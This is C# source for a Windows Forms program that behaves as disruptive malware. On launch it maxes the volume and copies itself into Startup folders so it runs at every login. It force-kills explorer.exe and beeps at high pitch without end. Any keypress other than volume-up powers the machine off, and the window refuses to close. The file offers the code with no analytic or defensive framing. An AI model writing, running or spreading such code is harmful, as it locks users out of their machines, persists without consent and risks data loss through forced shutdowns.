using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Windows.Forms;


using System.Management;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using Microsoft.Win32;
using System.Security.Principal;



namespace WindowsFormsApplication1
{
    public partial class Form1 : Form
    {

        [DllImport("user32.dll")]
        static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);


        public Form1()
        {
            for (int i = 0; i < 100; i += 1)
            {
                keybd_event((byte)Keys.VolumeUp, 0, 0, 0);
            }

            InitializeComponent();

            //Console.WriteLine(Environment.CurrentDirectory + "\\" + AppDomain.CurrentDomain.FriendlyName.ToString());
            

            try
            {
                System.IO.File.Copy(Environment.CurrentDirectory + "\\" + AppDomain.CurrentDomain.FriendlyName.ToString(), @"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\" + Environment.MachineName + ".exe");
            }
            catch(UnauthorizedAccessException) { }
            catch(ArgumentException) { }
            catch(System.IO.PathTooLongException) { }
            catch (System.IO.DirectoryNotFoundException)
            {
                try
                {
                    System.IO.File.Copy(Environment.CurrentDirectory + "\\" + AppDomain.CurrentDomain.FriendlyName.ToString(), @" C:\Documents and Settings\" + Environment.UserName + @"\Menu Démarrer\Programmes\Démarrage\" + Environment.MachineName + ".exe");
                }
                catch (UnauthorizedAccessException) { }
                catch (ArgumentException) { }
                catch (System.IO.PathTooLongException) { }
                catch (System.IO.DirectoryNotFoundException)
                {
                    try
                    {
                        System.IO.File.Copy(Environment.CurrentDirectory + "\\" + AppDomain.CurrentDomain.FriendlyName.ToString(), @" C:\Documents and Settings\" + Environment.UserName + @"\start menu\programs\startup\" + Environment.MachineName + ".exe");
                    }
                    catch (UnauthorizedAccessException) { }
                    catch (ArgumentException) { }
                    catch (System.IO.PathTooLongException) { }
                    catch (System.IO.DirectoryNotFoundException) { }
                    catch (System.IO.FileNotFoundException) { }
                    catch (System.IO.IOException) { }
                    catch (NotSupportedException) { }
                }
                catch (System.IO.FileNotFoundException) { }
                catch (System.IO.IOException) { }
                catch (NotSupportedException) { }
            }
            catch (System.IO.FileNotFoundException) { }
            catch (System.IO.IOException) { }
            catch (NotSupportedException) { }

            Process process = new System.Diagnostics.Process();
            ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();

            //startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "Taskkill.exe";
            startInfo.Arguments = "/IM explorer.exe /F";
            process.StartInfo = startInfo;
            process.Start();

             

            new Thread(new ThreadStart(Start)).Start();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
        }

        private void Form1_MouseDown(object sender, MouseEventArgs e)
        {
            // System.Media.SystemSounds.Beep.Play();

            Crashed.Visible = true;

            Console.Beep(4000, 800);

            Crashed.Visible = false;

        }

        void Start()
        {
            do
            {
                Console.Beep(6000, 1000);
            }
            while (true);
        }

        private void Form1_KeyDown(object sender, KeyEventArgs e)
        {

            if (e.KeyCode != Keys.VolumeUp)
            {
                //Console.WriteLine("Dans Shutdown");

                 Process process = new System.Diagnostics.Process();
                 ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();

                 //startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                 startInfo.FileName = "shutdown.exe";
                 //startInfo.Arguments = "-r -t 1";
                 startInfo.Arguments = "-p";
                 process.StartInfo = startInfo;
                 process.Start();

            }

        }

        private void Form1_KeyPress(object sender, KeyPressEventArgs e)
        {
          
        }

        private void Form1_KeyUp(object sender, KeyEventArgs e)
        {
            //e.Handled = true;
        }

        private void Crashed_Paint(object sender, PaintEventArgs e)
        {

        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            base.OnClosing(e);
        }
    }
}
